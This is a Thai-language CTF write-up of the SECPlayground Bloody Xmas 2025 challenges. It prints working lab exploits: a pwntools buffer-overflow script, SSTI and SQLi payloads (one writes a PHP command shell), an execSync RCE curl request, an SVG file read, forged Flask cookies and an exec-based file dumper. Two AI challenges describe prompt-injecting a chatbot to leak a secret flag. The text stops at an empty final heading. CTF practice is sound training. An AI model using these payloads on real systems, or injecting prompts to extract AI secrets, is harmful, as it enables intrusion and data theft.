---
title: SECPlayground Bloody Xmas CTF 2025 Writeup
published: 2026-01-07
description: "Writeup of Don't Know Everything Team in the SECPlayground Bloody Xmas CTF"
image: "images/0.jpg"
ogimage: "images/31.jpg"
tags: ["Don't Know Everything Team", "SECPlayground", "Bloody Xmas CTF", "2025", "CTF Writeup"]
category: "CTF Writeup"
draft: false
lang: ""
---

การแข่งขัน CTF ส่งท้ายปีโดย SECPlayground ในวันที่ 27-28 ธันวาคม ที่ผ่านมา

![1.png](images/1.png)

`Don't Know Everything` ขึ้น top 3 ด้วยวิธีการไม่นอน

- [@noonomyen](https://github.com/noonomyen)
- [@c0ffeeOverdose](https://github.com/c0ffeeOverdose)

ชิวๆ (แค่ตอนแรกหลังๆไม่ใช่ละ)

# Challenges

- **Cryptography**
  - Just another predictable day
  - **SecureBank**
  - **Reuse**
  - **Lucky Draw**
- **Digital Forensic**
  - **Sneaky monitor**
  - **Let's Door It#1**
  - Let's Door It#2
  - **The Grinch’s Digital Mischief. #1**
  - **The Grinch’s Digital Mischief. #2**
  - **Unexpected Order**
- **Misc**
  - Jail1
  - Jail2
  - **Something inside?**
  - **Where is my agent?**
  - Bidding#1
  - Bidding#2
  - Bidding#3
  - Fraud
- **Reverse Engineering**
  - **CLASSIFIED ALGORITHM**
  - **Rusty Sleigh**
  - **SD-License Checker**
  - **RCE101**
  - **The Unlucky Blacksmith**
- **Web Application Security**
  - **live_show**
  - **Make SQLi Great Again**
  - socredit
  - **Infra with React**
  - **Image Converter Service**
- **AI**
  - **Polite Challenge**
  - **Snow White Mirror (Mirror Mirror!!!!)**
- **Christmas Challenge**
  - **Christmas Secret**
  - **Where am I this Christmas?**
  - Only Good Kids Get Gifts #1
  - Only Good Kids Get Gifts #2
  - **XmasVault**
  - **Merry Christmas**
  - Christmas Gift 🎅🎁
  - **North Pole**
  - SweetShop
- **Pwnable + Pentest**
  - **XMas Factory#1 - Open Sesame**
  - **XMas Factory#2 - The Vault**
  - **XMas Factory#3 - The Recruiter**
  - **XMas Factory#4 - The Backend**
  - **XMas Factory#5 - The Heart**

# SecureBank

*Here we have created a SecureBank system, an online banking system with the source code available for download for security verification. The development team claims that their password reset system s very. secure. Here we analyze the source cade, find the vulnerability in resetting the password to access the account of admin@securebanklocal and extract the flag.* \
*Flag Format: crypto{...}*

![18.png](./images/18.png)

download source มาดูครับ

![17.png](./images/17.png)

ช่องโหว่คือ reset password ครับ เกิดจาก function `generate_reset_token` ที่สร้าง token โดยการใช้ email + time แล้วนำไป hash ซึ่งมันไม่ปกติครับ โดยปัญหาที่ตามมาคือมันไม่มีอะไรที่ random เลยทำให้เราสามารถเดา token ได้ง่ายๆเพียงแค่รู้ว่าเราขอ reset ไปเวลาไหน

step คือ กด gen token เป็น range เช่นสัก 5 ตัวแล้วกด reset ในเวลาเดียวกัน

```py
import hashlib
from time import time

def generate_reset_token(timestamp: int):
    token_data = f"admin@securebank.local{timestamp}"
    token = hashlib.md5(token_data.encode()).hexdigest()
    return token, timestamp

input("Enter to stamp...")
t = int(time())

for i in range(5):
    token, ts = generate_reset_token(t + i)
    print(f"Token: {token} | Timestamp: {ts}")
```

![19.png](./images/19.png)

![20.png](./images/20.png)

แล้วก็ทำการลองทีละอันเลยครับ `/reset-password/<token>`

![21.png](./images/21.png)

เมื่อได้แล้วก็ทำการตั้ง password ใหม่

![22.png](./images/22.png)

I'M IN

Flag `crypto{dXUXcbcbOc}`

# Reuse

*santa built a shiny encryption machine for Christmas. It uses a long random key and XOR to encrypt messages. The problem? The elves reused the same key for the flag and your messages...and the key pointer only moves forward.* \
*Flag Format: crypto{...}*

![15.png](./images/15.png)

เป็นหน้าเว็บเข้ารหัส และมี flag? ok hex นั้นคือ flag แน่ๆ แต่ key อยู่ไหน

chall อธิบายว่าเป็น XOR และใช้ key ซํ้า แต่จากที่ลองๆใส่ข้อความเดิมเหมือนจะไม่ซํ้าเลยนะ แต่ช้าก่อน key ยาว 10k bytes? หรือว่าจะ shift key แบบสุ่ม? เราเลยทำการลอง gen `A` ยาว 10k ยัดดู ซึ่ง output นั้นออกมาคงที่ เราเลยเอา output ที่ได้ไปถอดกลับเป็น key

![16.png](./images/16.png)

โดยใช้กฏเดิม `Plaintext ^ Key = Ciphertext`, and `Ciphertext ^ Plaintext = Key`

ซึ่งเราจะ slice ไปเรื่อยๆจนเจอ

```py
data = "A" * 10000
encrypted = bytes.fromhex(open("./encrypted.txt", "r").read().strip())

assert len(data) == len(encrypted)

key = [i ^ j for i, j in zip(data.encode(), encrypted)]

flag = bytes.fromhex("75e1d950c1e0ad7559bd582211bcf5443087c688465dab86fb9bea667ff7")

for i in range(len(key)):
    k = key[i:len(flag)+i]
    assert len(k) == len(flag), "Key not found"
    decrypted = bytes([a ^ b for a, b in zip(flag, k)])
    if b"crypto" in decrypted:
        print(f"Key found at position {i}: {bytes(k).hex()}")
        print(decrypted.decode())
        break

# Key found at position 9871: 2189bc70a78ccc1279d42b0272ce8c3444e8bdfe096ddcb7a8a29c090f8a
# The flag is crypto{vO0w1S9vop}
```

Flag `crypto{vO0w1S9vop}`

# Lucky Draw

*LuckyDraw Corp is a company that runs online raffles. The grand prize is $10,000 cash plus a mystery prize! They claim to use a "cryptographically secure random number generator, but you might be wondering, it might no be as secure as they claim.* \
*Flag Format: crypto{...}*

![25.png](./images/25.png)

download source มาดู again

![23.png](./images/23.png)

hey wait... หลอกป่าว หลอกมั้ง หรือเปล่า ยังไงนิ

![24.png](./images/24.png)

ช่องโหว่หรือ การ random ครับ อืมมม random ก็จริง แต่ seed คือสิ่งที่ดันไม่ใช่การ random ซะทีเดียว แต่มันคือ time อีกแล้ว

วิธีชนะคือต้อง fetch api ให้ตรงจังหวะแล้ว call `random.randint(0, 99) = 0` ถึงจะได้ flag

สิ่งที่เราต้องทำคือ ถาม server ว่าเวลาตอนนี้คือเท่าไหร่ ผ่าน `/api/time` แล้วเอามา brute force หาว่าต้องรออีกกี่วิ timestamp นั้นถึงจะเป็น seed ที่ random ได้ 0 ในครั้งแรก

```py
import requests
import random
import time

url = "http://[IP]:[PORT]"

r = requests.get(f"{url}/api/time")
server_time = r.json()["timestamp"]

print(f"[*] Server time: {server_time}")

target_time = 0
for i in range(1, 100):
    future_ts = server_time + i
    random.seed(future_ts)
    if random.randint(0, 99) == 0:
        target_time = future_ts
        print(f"[+] Found winning seed at: {target_time} (in {i} seconds)")
        break

if target_time == 0:
    print("[-] No winning seed found nearby.")
else:
    while True:
        curr = int(time.time())
        if curr >= target_time:
            print(f"[!] Fire! attacking with time: {curr}")
            res = requests.post(f"{url}/draw")
            print(res.json())
            break
        time.sleep(0.1)
```

![26.png](./images/26.png)

อ้าว...

Flag `crypto{gpLonBDS0f}`

# Sneaky monitor

*Dear Operator* \
*one of our employee’s machine seems to get infected with some kind of malware. We need you to help analyze the artifacts to find where the malware is located.* \
*Here is the list of what we know from the user:* \
*- He got a phishing email and downloaded a malicious binary.* \
*- The binary claimed itself as a Security "Monitoring” system.* \
*- He removed the binary after he notice a strange behavior, but it seems too late as it has already been executed.* \
*- He notice a machine works slower than usual even the network is slower.* \
*We suspect that it might be something that has to do with the machine startup process but we found nothing in “autostart’ and ‘cron’. Could you please look into this? Thanks.* \
*IT Manager.*

![54.png](./images/54.png)

เริ่มจาก search ก่อนเลย ซึ่งเจอเลย

![55.png](./images/55.png)

Flag `forensic{sn3@ky_h1dd3n_entr@nc3}`

# Let's Door It#1

*A client endpoint triggered an EDR alert for suspicious behavior.* \
*The SOC isolated the host and requested the suspicious file from the user for offline analysis. As SOC team, please research and analyze its behavior and identify which known malware family it most closely resembles* \
*based on its execution patterns. Please DO NOT RUN ON LOCAL MACHINE* \
*Flag Format forensic{MALWARE _FAMILY_NAME}*

Solved by [@c0ffeeOverdose](https://github.com/c0ffeeOverdose)

![14.png](./images/14.png)

ตอนแรกผมตอบแต่มันผิด

Flag `forensic{NOTDOOR}`

# The Grinch’s Digital Mischief. #1

challenge ต้องการทราบว่าการโจมตีคือ CVE อะไร \
Flag Format: `forensic{CVE-XXX-XXXXX}`

![56.png](./images/56.png)

มีไม่กี่ตัว

![57.png](./images/57.png)

ใน access.log มี CVE อยู่ตัวหนึ่งเป็นชื่อไฟล์ ลองๆตอบดู ซึ่งมันถูก มันคือ RCE ใน React Server Components (React2Shell)

Flag `forensic{CVE-2025-55182}`

# The Grinch’s Digital Mischief. #2

*After identifying the vulnerability used in the attack, determine who is behind the attack by analyzing the provided log files for clues.* \
*Flag Format: `forensic{Threat Actor Name}`*

![58.png](./images/58.png)

มีไม่กี่ตัวอีกเช่นกัน

Flag `forensic{UNC6588}`

# Unexpected Order

*Our Finance Department received a suspicious email with an attachment named Orden de compra..uu. They* \
*were expecting a purchase order, but their usual software can't open it.* \
*Your task is to analyze the provided file and answer the following question:* \
*Upon execution, the malware creates a subdirectory in the %TEMP% folder to store its payload. What is the name of this directory?* \
*Flag Format: forensic{directory_name} (Example: If the directory is /temp/john, the flag is forensic{john})* \
*Warning: Do not execute the file. It contains a potential malware dropper.*

```txt
file '20250507211052-Orden de Compra_887965-sebasbalca.eml' 
20250507211052-Orden de Compra_887965-sebasbalca.eml: RFC 822 mail, Unicode text, UTF-8 text, with CRLF line terminators
```

เป็นไฟล์ raw email ซึ่งน่าจะมีอะไรสักอย่างอยู่ในนั้น

![12.png](./images/12.png)

ใช้ ripmime แยกออกมาได้ ได้ไฟล์ `Orden de compra_976576453478648554756789654437865453458.uu` ซึ่งคือไฟล์ rar และก็แยกออกมาได้ `Orden de compra_976576453478648554756789654437865453458.exe`

ok chall ถามเราว่า directory ที่ถูกสร้างชื่ออะไร งั้นเราไปต่อที่ windows กัน โดยเราจะใช้ process monitor ดักดูว่า process นี้ทำการสร้าง file อะไรบ้าง

![13.png](./images/13.png)

Flag `forensic{ostene}`

# Something inside?

ได้มาเป็นไฟล์ โดยถามว่ามีอะไรถูกซ่อนอยู่ใน นี้ challenge พูดถึง printer ซึ่งเราก็นึกได้ว่า printer มันมี yellow dots แต่จากที่ดูแล้วมันไม่ใช่
Format `misc{...}`

เริ่มจาก ทำให้มันชัดๆก่อน

![59.png](./images/59.png)

อืมมมม ไม่มีอะไร หลังจากลองหายวิธี จบที่ ลองนำสีทุก color มารวมกันแล้วให้เป็นขาวดำ

![60.png](./images/60.png)

คิดได้ไงเนี่ย

```py
import cv2
import numpy as np

def extract_all_to_black(image_path, output_path):
    img = cv2.imread(image_path)
    if img is None:
        return 1

    white_mask = (img[:, :, 0] == 255) & (img[:, :, 1] == 255) & (img[:, :, 2] == 255)
    result = np.full(img.shape, 255, dtype=np.uint8)
    result[~white_mask] = [0, 0, 0]
    cv2.imwrite(output_path, result)
    num_black_pixels = np.sum(~white_mask)

    return 0

if __name__ == "__main__":
    exit(extract_all_to_black("ransom_note.png", "raw_extreme_black.png"))
```

Flag `misc{Y3ll0w_D0ts_R3v3al_TrUth}`

# Where is my agent?

*A spy codenamed FoxMask'claims to be on vacation, but intelligence believes he's delivering classified information to a Dead Drop before feigning a run to cover his tracks. We couldn't access his running app account, but we found he uses the username ‘Runner’ and the last name 1337* \
*Mission: Find out where he is.* \
*Format: misc{city_name} such as misc{bangkok}, misc{newyork}*

ลองไปดู strava กัน

![61.png](./images/61.png)

search 1337 ลองเพิ่ม runner เข้าไปด้วย น่าจะใช่นะ

![62.png](./images/62.png)

มีรันอยู่ที่ Kyoto

Flag `misc{kyoto}`

# CLASSIFIED ALGORITHM

*Your agents have successtully exfitrated the authentication source cods from a covert 'ShadowCorp' server.* \
*Your mission is to breach the system and retrieve the Clearance Code (Flag).* \
*Do not be intimidated by the copyright warnings within the code...and most importantly, do not rely on Al as it might refuse to perform this task!* \
*Flag Format: re{...}*

![29.png](./images/29.png)

คือ C# ที่ obfuscate ด้วย prompt เพื่อหลอก llm ไม่ให้ solve ซึ่งถามว่ากันได้ไหม คำตอบคือไม่เลยสักนิด

ผลรวมที่ได้มาลบ array โดย loop 500 ครั้ง even ให้ i mod 3 และ +1 ส่วน odd ให้ XOR 0xFF

```c#
class Solver
{
    static void Main()
    {
        int[] enc = [-42085, -42115, -42068, -42111, -42053, -42042, -42068, -42079, -42059, -42114, -42053, -42060, -42068, -42091, -42112, -42049, -42112];
        int v = 0, inc = 0;

        for (int i = 0; i < 500; i++)
        {
            if (v % 2 == 0)
            {
                v -= i % 3;
                inc++;
            }
            else
            {
                v ^= 0xFF;
            }
        }

        int offset = inc + v;
        string flag = "";
        foreach (int x in enc) flag += (char)(x - offset);

        Console.WriteLine(flag);
    }
}
```

![30.png](./images/30.png)

Flag `re{N0_4ny_Th1ng_H3r3}`

# Rusty Sleigh

*Santa has decided to upgrade his sleigh’s ignition system to the cutting-edge “Rusty Sleigh” firmware to prevent Grinch attacks. However, the lead developer elf went on vacation and forgot to leave the access code!* \
*Santa is grounded until the system is unlocked. We have access to the dashboard, but the ignition logic is hidden inside a binary blob running in your browser.* \
*Can you reverse engineer the system, find the missing configuration, and recover the correct passcode to start the engines?* \
*Flag Format: re{...}*

![63.png](./images/63.png)

อืมมม

![64.png](./images/64.png)

index.js มีการ fetch sleigh_config.bin มาเก็บเป็น uint8 array โดย function unlock จะไปเรียกใช้ check_pass ด้วย input และ uint8 array

![65.png](./images/65.png)

ตามมายัง check_pass จะพบว่ามีการ call ต่อไปที่ wasm.check_pass

![66.png](./images/66.png)

ซึ่งตัว module จะอยู่ที่ rusty_sleigh_bg.wasm

เมื่อเรามาถึงตรงนี้แล้ว สิ่งที่เกิดขึ้นคือ มีการ check pass (flag) ใน WebAssembly ที่น่าจะเขียนด้วย rust (rusty_sleigh_bg.wasm)

เมื่อเราโหลดมาละ เราก็ต่อด้วย wasm-decompile

![67.png](./images/67.png)

ยาวยัยซับซ้อน โยนใช้ llm เขียน python แก้ละกานครับ

```py
# sleigh_config.bin
hex_string = "9920d7177cb6738b39b1be6655fc"
encrypted_bytes = bytes.fromhex(hex_string)

flag = ""
for i, enc_byte in enumerate(encrypted_bytes):
    # Algorithm: Char = ROR3(Enc ^ (Index + 10))
    # Reverse XOR (Key = Index + 10)
    key = i + 10
    xored_val = enc_byte ^ key

    # Reverse ROL3 -> ROR3 (Rotate Right 3) 8-bit
    # (val >> 3) | (val << 5) & 0xFF
    decrypted_char_code = ((xored_val >> 3) | (xored_val << 5)) & 0xFF

    flag += chr(decrypted_char_code)

print(f"Flag: {flag}")
```

Flag `re{CN7lSeTUnh}`

# SD-License Checker

*Plaase find license from hidden.* \
*Flag pattern is re{..}*

![68.png](./images/68.png)

ได้ไฟล์ sd_license.exe มาฮะ เริ่มจากใช้ ghidra reverse

![69.png](./images/69.png)

หลังจากสำรวจสักพักก็เจอ array แปลกๆอยู่ที่ `FUN_140002d04` > `FUN_140001590`

![70.png](./images/70.png)

มี loop XOR อยู่ ไหนเราลองถอดดู

![71.png](./images/71.png)

Flag `re{keygen_kDoU9PATRS}`

# RCE101

*You've discovered a vulnerable service running on a remote server. Initial reconnaissance shows it's a simple program that takes user input but has poor memory management. Your intelligence suggests there's a hidden function in the binary that can print the flag, but it's never called normally during execution. You'll need to analyze the binary and craft a special payload to redirect the execution flow.* \
*Flag format: pwn{.....}*

![72.png](./images/72.png)

เริ่มจากใช้ ghidra reverse จะมี condition ที่ขึ้นกับ random อยู่แต่ช่างมันไม่ได้มีผลอะไรมาก

![73.png](./images/73.png)

check_access_code จะ return true เมื่อ code = 0x539 (1337)

![74.png](./images/74.png)

มีช่องโหว่ที่ password ครับ มีการใช้ gets ซึ่งเป็น unsafe function (no size control) ทำให้เราใส่ input ได้เกินขนาด buffer

![75.png](./images/75.png)

มี function spawn_shell อยู่ ซึ่งชัดเจนละครับว่ามันคือ stack buffer overflow - ret2win

![76.png](./images/76.png)

ทางสะดวก

![77.png](./images/77.png)

ก็ทำการหา offset ครับ โดยเราจะ break ตรง call printf หลังจาก input password ไป ซึ่งเราจะใช้ input ปกติจนถึง password แล้ว fill หาว่าอยู่อีกกี่ bytes ถึงจะถึง ret

จากที่เห็นคือ 16 bytes ครับ ซึ่งจะสรุปได้ว่า จะ jump ไป spawn_shell ต้องใช้ padding 80 chars ก่อนเขียน address

```py
from pwn import *

name = "pwn101"
elf = ELF(name)
addr = elf.symbols["spawn_shell"]
buffer = 64
offset = 16

p = process(name)
p.sendline(b"1337")
p.sendline(b"test")
p.sendline((b"A" * (buffer + offset)) + p32(addr))
p.interactive()
```

![78.png](./images/78.png)

Flag `pwn{DF6bOzHjLt}`

# The Unlucky Blacksmith

![7.png](./images/7.png)

ได้ไฟล์ exe ตัวหนึ่งมา น่าจะเป็นเกมนะ แต่ detect is easy บอกว่ามันคือ python

![6.png](./images/6.png)

หลังจากใช้ pyinstxtractor และ pycdc แกะก็พบกับ pyarmor...

![8.png](./images/8.png)

เกมแหละ อยากให้โกงใช่ไหมล่าาา

เอ๊ะใจอยู่ว่าถ้าจะแก้ memory ตรงๆได้ ? เพราะ python ตัวแปรที่เก็บ int เป็นประเภท immutable คือการที่เมื่อเลขเปลี่ยน มันจะสร้าง object ใหม่สำหรับเลขนั้นๆเลย จึงเป็นไปไม่ได้ที่จะแก้ค่าจาก memory โดยตรงด้วยวิธีปกติ (แต่ mutable ยังพอทำได้บ้าง) แต่อย่างไรก็ตามลองหน่อยละกานนนน

เราจะใช้ Cheat Engine สำหรับแก้ memory ซึ่งจะเริ่มจาก `Unknown initial value` เพราะไม่แน่ใจว่า value จะถูกป้องกันไหม แล้วกด ENHANCE แล้วดูว่าค่าเปลี่ยนไปทิศทางไหน

- เพิ่ม ให้เปลี่ยน scan type เป็น `Increased value` แล้ว next scan
- ลด ให้เปลี่ยน scan type เป็น `Decreased value` แล้ว next scan

จนเจอ address และค่าที่สัมพันธ์กับการเปลี่ยนแปลง

![9.png](./images/9.png)

สำหรับเคสนี้คือง่ายครับ ไม่ได้กันอะไรเลย ก็ทำการ add ลง address list เลย แล้ว edit มันซะ

![10.png](./images/10.png)

Flag `re{Mem0ry_9GG5rOiIes_Ch4ll3ng3!}`

เพิ่มเติมครับ flag บอกให้เราแก้ memory นี้เองแต่มันเป็นไปได้ยังไงใน python runtime? หลังจบงานผมจึงหาคำตอบต่อแล้วพบว่าทำไมถึงสามารถทำแบบนั้นได้ ซึ่งเราได้ใช้ pyinjector เจาะ python runtime ดูก็พบว่า จริงๆแล้ว `enhancement_level` เก็บเป็น type `ctypes.c_long` ซึ่งเป็นการเก็บค่าตัวแปรระดับตํ่า และเรายังสามารถ call `globals()["app"].decrypt_flag()` เพื่อถอด flag ได้ครับ

![11.png](./images/11.png)

# live_show

*It's REAL TIME!* \
*Flag Format: web{...}*

![27.png](./images/27.png)

ช่องโหว่คือ SSTI (Server-Side Template Injection) ครับ คือ server รับ input ของ user ไป render โดยไม่ escape ก่อน ซึ่งทำให้เกิดการโจมตีแบบ SSTI ได้ ซึ่งเราก็อ่าน flag จาก env ได้เลย

```py
{{ self.__init__.__globals__.__builtins__.__import__('os').environ.get('RANDOM_SECRET', 'FLAG not found') }}
```

![28.png](./images/28.png)

Flag `web{6TsTxmb59m}`

# Make SQLi Great Again

*Can you stil perform SQLi if it's not in the clause you mastered.* \
*Flag Format web{...}*

![79.png](./images/79.png)

sql injection?

![80.png](./images/80.png)

ช่าย มันคือ sql injection ซึ่งเมื่อลอง dump ก็พบว่ามันไม่ได้ผล เลยเปลี่ยนเป็นเขียน shell แทน

โดยเราจะเอา php shell ไป encode เป็น hex เป็น payload แล้วใช้ OUTFILE เขียนลงไปที่ /var/www/html/shell2.php โดยให้ปิดไฟล์ด้วย payload ของเรา

```txt
1 INTO OUTFILE '/var/www/html/shell2.php' LINES TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e
```

หลังจากหาอยู่นานก็เจอว่ามี readflag elf อยู่

```txt
shell2.php?c=/readflag
```

![81.png](./images/81.png)

Flag `web{Y9fLaHY86O}`

# Infra with React

*The monitoring system was used to monitor the machine. Please review source code to find the vulnerability.* \
*The flag is somewhere in the machine.* \
*Format: web{..}*

Solved by [@c0ffeeOverdose](https://github.com/c0ffeeOverdose)

![48.png](./images/48.png)

โหลด source มาซะ `server.js`

```js
      if (moduleId && moduleId.includes('#')) {
        const [moduleName, exportName] = moduleId.split('#');
        
        const loadedModule = webpackRequire(moduleName);
        
        if (loadedModule && loadedModule[exportName]) {
          const fn = loadedModule[exportName];
          
          if (typeof fn === 'function') {
            const boundFn = fn.bind(null, ...boundArgs);
            const result = boundFn();
            
            return {
              success: true,
              result: typeof result === 'string' ? result : JSON.stringify(result)
            };
          }
        }
      }
```

เมื่อเราอ่านตรงที่รับ data เข้าไปเมื่อเรียก `/webpack` มันจะแยก module name และ export name ด้วย `#` และ call ถ้ามี โดยจะรับ module ผ่าน `webpackRequire` ซึ่งถูกสร้างจาก `createWebpackRequire`

```js
// Pre-load modules for webpack simulation
let loadedModules = null;

async function initModules() {
  if (loadedModules) return loadedModules;
  
  const [reactMod, vmMod, cpMod, fsMod, osMod, pathMod] = await Promise.all([
    import('react'),
    import('vm'),
    import('child_process'),
    import('fs'),
    import('os'),
    import('path')
  ]);
  
  loadedModules = {
    'react': reactMod,
    'vm': vmMod,
    'child_process': cpMod,
    'fs': fsMod,
    'os': osMod,
    'path': pathMod
  };
  
  return loadedModules;
}

// Initialize modules on startup
await initModules();

// Simulate webpack module registry
globalThis.__webpack_require__ = function(id) {
  return loadedModules[id] || {};
};

// Create webpack require function
function createWebpackRequire() {
  return function __webpack_require__(id) {
    return loadedModules[id] || {};
  };
}
```

เมื่อตามมาดู `createWebpackRequire` จะพบว่ามัน return callback function ที่ทำการดึง module มาจาก `loadedModules` หากมี โดย `loadedModules` จะประกอบไปด้วย module ต่างๆตามที่เห็น แต่ที่เราสนใจที่สุดก็คือ `child_process`

```js
async function processServerAction(formData, webpackRequire) {
  const actionRef = formData['$ACTION_REF_0'];
  const actionData = formData['$ACTION_0:0'];
  
  if (actionRef !== undefined && actionData) {
    try {
      const actionMeta = JSON.parse(actionData);
      const moduleId = actionMeta.id;
      const boundArgs = actionMeta.bound || [];
```

กลับมาที่ `/webpack` จะเห็นว่ามันรับ data จาก 2 ตัว โดย moduleId จะได้มาจาก `$ACTION_REF_0` ส่วน `$ACTION_0:0` ขอแค่ประกาศอะไรก็ได้ที่ไม่ใช่ `undefined`

จึงสรุปได้ว่า เราต้องเรียก `$ACTION_0:0` ประมาณนี้

```js
{
  "id": "MODULE#EXPORT",
  "bound": [ARGS]
}
```

```sh
curl -sS -X POST -F '$ACTION_REF_0=1' -F '$ACTION_0:0={"id":"child_process#execSync","bound":["COMMAND"]}' http://127.0.0.1:3000/webpack
```

![49](./images/49.png)

อีกคนเป็นคน solve ฮะ ผมเลยไม่รู้ว่า flag อยู่ที่ไหน

Flag `web{m08899gzbQ}`

# Image Converter Service

*Just a Free Image Converter service, please use it, not hack it. The flag is inside /tmp/flag.txt* \
*Flag Format web{...}*

![83.png](./images/83.png)

LFI แหละ แต่จะติดออกมายังไงละ

![84.png](./images/84.png)

หลังจากดูความน่าจะเป็นตกไปที่ svg ครับ เนื่องจาก svg สามารถที่จะ ref ไปที่ local file ได้

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg width="800" height="600" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="text:/tmp/flag.txt" x="0" y="0" width="800" height="600" />
</svg>
```

![85.png](./images/85.png)

work

Flag `web{nyqIzHm4Mf}`

# Polite Challenge

*You have been assigned a mission to break into an AI system that seems to be hiding something behind ordinary words. Your task is to find a way to perform a prompt injection to trick the AI into revealing the secret flag.* \
*Conditions:* \
*- The answer must be in the format ai{...}.* \
*- You must communicate in Thai, because the Al wil only respond in Thai.* \
*Flag Format: ai{...}*

![2.png](images/2.png)

![3.png](images/3.png)

Flag `ai{0VAZbkDRbC}`

# Snow White Mirror (Mirror Mirror!!!!)

*You have been assigned a mission to break into an AI system that seems to be hiding something behind ordinary words. Your task is to find a way to perform a prompt injection to trick the AI into revealing the secret flag.* \
*Conditions:* \
*- The answer must be in the format ai{...}.* \
*- Asking directly will NOT yield the flag.* \
*- You must communicate in Thai, because the Al wil only respond in Thai.* \
*Flag Format: ai{...}*

![4.png](images/4.png)

![5.png](images/5.png)

Flag `ai{MnmICwWVLf}`

# Christmas Secret

*Santa has launched a new online file gallery to manage his holiday uploads* \
*Only trusted users are allowed to upload fles and access the gallery safely through the web interface.* \
*Flag Format: web{xxx}*

- Login bypass [@c0ffeeOverdose](https://github.com/c0ffeeOverdose)
- Solved [@noonomyen](https://github.com/noonomyen)

![41.png](images/41.png)

งง ใช่ผมก็งง แต่ [@c0ffeeOverdose](https://github.com/c0ffeeOverdose) หาทางเข้าให้แล้วผมเลย easy หน่อย (มั้งนะ)

![42.png](images/42.png)

จริงๆ มันคือ flask ซึ่งตอน login ใช้ flask cookie session ซึ่งมันสามารถ brute force ได้หาก secret key ง่ายเกิน

![43.png](images/43.png)

เป็นอย่างที่ว่าครับ secret key คือ `decembersnow`

เมื่อเราได้ key แล้วเราก็แค่ sign มันขึ้นมาใหม่ โดยเราจะแก้ให้เรา login แล้ว

![44.png](images/44.png)

เสร็จแล้วเอา cookie นี้ไปแทน cookie เดิมใน browser ได้เลย

![45.png](images/45.png)

upload? จริงๆ อีกคนเขานัวไประดับหนึ่งแล้วครับ แต่ไม่เจออะไร ผมเลยรับต่อจากตรงนี้

![46.png](images/46.png)

จริงๆก็ลองเล่นไปหลายแบบเลยแหละ และก็พึ่งสังเกตว่ามีการเปิด debug mode ไว้ ทำให้เราเห็น error ที่เกิดขึ้นได้ ตอนแรกที่เห็นเป็น error ชื่อไฟล์ include `%00` ครับ ตัว `os.path.realpath` error ให้เห็น ซึ่งผมเลยลองๆใส่อะไรมั่วๆไปซึ่ง ไม่ได้มีใน list upload ไปเลยเจอ error บรรทัดหนึ่งเข้าให้ ซึ่งก็คือภาพนี้แหละ จะเห็นว่ามี error ตรง `lower.endswith('.txt')` อยู่ ที่ว่า `lower` เรียกก่อนประกาศ แต่ด้านล่างดันมี `exec(code)` อยู่ (แปลกๆ)

ซึ่งเดาๆได้ว่าถ้าเป็นไฟล์ `.txt` มันจะรัน `exec` เราจึงยัด dumper เราเข้าไป ให้มันพ่น output ออกทาง exception

```py
import os
import base64

target_dir = "/app"
result = "--- START DUMP ---\n"

for root, dirs, files in os.walk(target_dir):
    for filename in files:
        filepath = os.path.join(root, filename)
        try:
            with open(filepath, "rb") as f:
                content = f.read()
                b64_content = base64.b64encode(content).decode('utf-8')
                result += f"FILE: {filepath}\nCONTENT: {b64_content}\n----------------\n"
        except Exception as e:
            result += f"FILE: {filepath}\nERROR: {str(e)}\n----------------\n"

raise Exception(result)
```

![47.png](images/47.png)

ซึ่งมัน upload ได้ฮะ และก็อย่างที่เห็น เราได้ flag มาละ

Flag `web{qNFBllv4tr}`

ต่อนิดหน่อย

```py
@bp.route("/uploads/<path:filename>", methods=["GET"])
def uploads(filename):
    if not session.get("logged_in"):
        return ("Access Denied", 403)

    file_path = safe_join_upload(current_app.config["UPLOAD_FOLDER"], filename)

    if Path(file_path).exists():
        with open(file_path, "rb") as fp:
            data = fp.read()

        lower = filename.lower()
        if lower.endswith(".png"):
            ctype = "image/png"
        elif lower.endswith(".jpg") or lower.endswith(".jpeg"):
            ctype = "image/jpeg"
        elif lower.endswith(".gif"):
            ctype = "image/gif"
        elif lower.endswith(".pdf"):
            ctype = "application/pdf"
        else:
            ctype = "text/plain; charset=utf-8"

    if lower.endswith(".txt"):
        try:
            code = data.decode("utf-8", errors="strict")
            exec(code) 
        except Exception:
            raise
```

นี้คือ code ที่ error ไปแบบเต็มๆซึ่งจะเห็นว่า มัน error เพราะเมื่อไฟล์ไม่มีอยู่จริง `lower` จะถูกเรียกใช้ก่อนประกาศ จึงทำให้เราเห็นว่ามี `exec(code)` ซ่อนอยู่เมื่อไฟล์ลงท้ายด้วย `.txt`

# Where am I this Christmas?

*Where am I in this Christmas? I won't tell you directiy-but I left you something, Find the city I'm in and submit the flag, Search social media or Eli_testdev.* \
*Flag Format: misc{City}*

![32.png](./images/32.png)

เราหาจากใน instagram ฮะ แต่จากที่ดูๆแล้วไม่รู้อะว่าอยู่ที่ไหน

![33.png](./images/33.png)

เลยลองๆหาคำที่น่าสนใจจนเจอประโยคหนึ่งเข้า

![34.png](./images/34.png)

เจอละ

Flag `misc{HongKong}`

# XmasVault

*It's the first day of the new year, and the SecureVault Security Operations Portal has just rolled out a festive login page to celebrate the occasion.* \
*However, in the rush to launch the “New Year Edition,”the development team seems to have missed some critical security flaws.* \
*Format Flag: web{...}*

![35.png](./images/35.png)

ยังไงนิ

![36.png](./images/36.png)

เริ่มจาก sql bypass ซึ่ง มัน work ครับ แต่รอบแรกเป็น user เลยใช้ offset limit เลื่อน user ดูอีกทีถึงได้เป็น admin ครับ

![37.png](./images/37.png)

blinding?

หลังจากลองหา flag.txt ไปสักพักก็จะหาอะไรก็ไม่เจอบ้าง ติด path traversal detect บ้างเลยลองอ่านตัวเองดู

![38.png](./images/38.png)

อ๋อ ไม่ได้กันเยอะนิ แค่ `..` `/etc` เฉยๆ ก็หาต่อไปเรื่อยๆจนนึกได้ว่า instance challenge พวกนี้เป็น container นิ บางทีเขาอาจะไม่ลบ cmd / entrypoint script ทิ้งเหมือนๆทุกครั้งก็ได้

![39.png](./images/39.png)

ซึ่งจริง มี `/start.sh` อยู่ ซึ่งมันบอกว่า flag ถูก replace ไปไว้ที่ `/opt/securevault/index.php`

![40.png](./images/40.png)

ตามไปดูสิครับ

Flag `web{2qSknGj4vb}`

# Merry Christmas

